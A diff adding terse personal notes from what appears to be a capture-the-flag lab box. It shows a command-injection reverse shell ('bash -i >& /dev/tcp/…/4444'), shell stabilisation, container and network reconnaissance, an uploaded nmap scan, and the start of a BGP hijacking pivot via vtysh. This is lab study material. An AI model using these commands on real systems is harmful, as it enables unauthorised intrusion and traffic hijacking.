@@ -47,4 +47,52 @@ Tryed exploit to RCE.
 ### tcpdump -i tun0 icmp                   on my computer
 ### entered encoded value to check parameter using burp. Got it
 
+### root;bash -i >& /dev/tcp/10.10.14.71/4444 0>&1
+Got user
+### cat /proc/1/environ          -> because we are root, had to check if we are in a container
+we are in lxc container
+### python3 -c 'import pty; pty.spawn("/bin/bash");'
+### Ctrl+Z
+### stty raw -echo
+### fg
+### export TERM=xterm-256color
+### clear
 
+
+
+
+### netstat -alnp | grep LIST
+no http service. This is odd
+### cat /etc/lsb-release                ensure the type of OS
+### ssh-keyscan localhost               ensure the right keys for SSH
+### Ctrl+Z
+### ssh-keyscan 10.10.10.105            ensure the right keys for SSH
+keys are different
+### arp -an                             says with who the box is talking
+After reading tickets, we know that a very important FTP server is on 10.120.15.10
+there is no 10.120.15.0/24 network on arp -an list
+trying to ping that network
+### ping 10.120.15.1                    everything is ok. 10.120.15.1 is a gateway
+Now we'll install nmap on the box.
+create a binary version of nmap
+then supply it through SimpleHTTPServer
+then scan network
+### chmod +x ./nmap
+### ./nmap -p 21 10.120.15.0/24
+10.120.15.10 FTP is opened
+check the version of FTP
+### nc 10.120.15.10 21
+ftp version vsFTPd 3.0.3                not vulnerable
+### netstat -alnp | grep LIST           found a bunch of bgp services
+### crontab -l                          look on running scripts. found one
+### cat /opt/restore.sh
+### cat /etc/quagga/zebra.conf          looks like a cisco config file
+### cat /etc/quagga/bgpd.conf           BGP config file with BGP commands
+### vtysh
+BGP hijacking
+looking on a photo in /doc directory on a web-server and looking on bgp commands we
+can figure out in which network we are.
+### show running-config
+### show ip route 10.120.15.10
+found out that we have to go through 10.78.11.2 in order to get to FTP server
+###
